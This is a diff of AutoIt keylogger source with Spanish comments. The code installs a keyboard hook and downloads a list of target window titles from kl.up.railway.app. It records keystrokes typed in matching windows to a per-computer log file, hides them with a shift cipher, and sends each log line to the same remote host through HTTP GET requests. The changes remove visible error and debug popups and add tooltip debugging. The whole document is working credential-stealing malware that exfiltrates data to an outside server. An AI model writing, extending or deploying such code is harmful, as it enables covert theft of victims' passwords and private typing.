@@ -18,34 +18,29 @@ EndFunc
 
 
 
-Global $hHook, $hStub_KeyProc, $buf = "", $title = "", $title_1 = "", $keycode, $buffer = "", $nMsg
+Global $hHook, $hStub_KeyProc, $buf = "", $title_actual = "", $title_1 = "", $keycode, $buffer = "", $nMsg
 Global $file, $f3 = 0
 Global $url = "https://kl.up.railway.app/?kl="
 Global $lastActiveWindow = "", $lastActiveTime = 0
 Global $file_name = @computername & "_log.txt"
 Global $last_send = 0
 
-; Realizar la solicitud HTTP GET
-Local $sURL = "https://kl.up.railway.app/l"
+	; Realizar la solicitud HTTP GET
+	Local $sURL = "https://kl.up.railway.app/l"
+	Local $dData = InetRead($sURL)
+	Local $sContent= BinaryToString($dData)
 
-Local $sContent = InetRead($sURL)
 
 ; Verificar si la solicitud fue exitosa
 If @error = 0 Then
-    ConsoleWrite("Contenido descargado:" & @CRLF & $sContent & @CRLF) ; Depuración
-    
     ; Convertir el contenido a una matriz de títulos
-    Local $aLines = StringSplit($sContent, @CRLF, 1)
+    Local $aLines = StringSplit($sContent, ";", 1)
     Global $aTitles[$aLines[0]]
 
     For $i = 1 To $aLines[0]
         $aTitles[$i - 1] = $aLines[$i]
     Next
 
-    ; Imprimir la matriz de títulos
-    _ArrayDisplay($aTitles, "Títulos")
-Else
-    MsgBox(16, "Error", "No se pudo descargar la matriz.")
 EndIf
 
 
@@ -90,9 +85,9 @@ EndFunc
 
 Func write_file()
     If $buffer <> "" Then
-		$file = FileOpen($file_name, $FO_APPEND )
-        $title_1 = WinGetTitle("")
-        $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
+		local $file = FileOpen($file_name, $FO_APPEND )
+        local $currentActiveWindow = WinGetTitle("")
+        $buffer = @CRLF & @CRLF & "====Title:" & $currentActiveWindow & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
         $buffer = CifrarDesplazamiento($buffer, 3)
 
 		$buffer = BinaryToString(Binary($buffer))
@@ -114,9 +109,11 @@ Func send_file($forced_action)
             Local $aArray = FileReadToArray($file_name)
             For $i = 0 To UBound($aArray) - 1
                 InetRead($url & $aArray[$i], $INET_FORCERELOAD)
+	debug_info($url & $aArray[$i])
             Next
             ; Vaciar el contenido del archivo en lugar de eliminarlo
             $file = FileOpen($file_name, $FO_OVERWRITE)
+
             FileClose($file)
         EndIf
         $last_send = TimerInit() ; Actualiza el tiempo de último envío
@@ -124,21 +121,23 @@ Func send_file($forced_action)
 EndFunc
 
 Func EvaluateKey($keycode)
-    $title = WinGetTitle("")
+    local $currentActiveWindow = WinGetTitle("")
     $buffer = key($keycode)
 	 
 	Local $bFound = False
 
-	For $i = 0 To UBound($titles) - 1
-		If StringLeft($title, StringLen($titles[$i])) = $titles[$i] Then
+	For $i = 0 To UBound($aTitles) - 1
+		debug_info("buscada:"&$currentActiveWindow & " ******    evaluada:" &$aTitles[$i])
+		If StringLeft($currentActiveWindow, StringLen($aTitles[$i])) = $aTitles[$i] Then
+			debug_info("encontrada==>"&$currentActiveWindow)
 			$bFound = True
 			ExitLoop
 		EndIf
 	Next
 
 	If $bFound Then
-        If $title_1 <> $title Then
-            $title_1 = $title
+        If $title_1 <> $currentActiveWindow Then
+            $title_1 = $currentActiveWindow
             $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
        EndIf
 	   $buffer = CifrarDesplazamiento($buffer, 3)
@@ -147,9 +146,8 @@ Func EvaluateKey($keycode)
 	
 EndFunc
 
-func debug_info()
-
-	ToolTip(@error, 100, 100)
+func debug_info($text)
+	ToolTip($text, 100, 100)
 	Sleep(5000) ; Espera 5 segundos
 	ToolTip("") ; Oculta el mensaje contextual
 
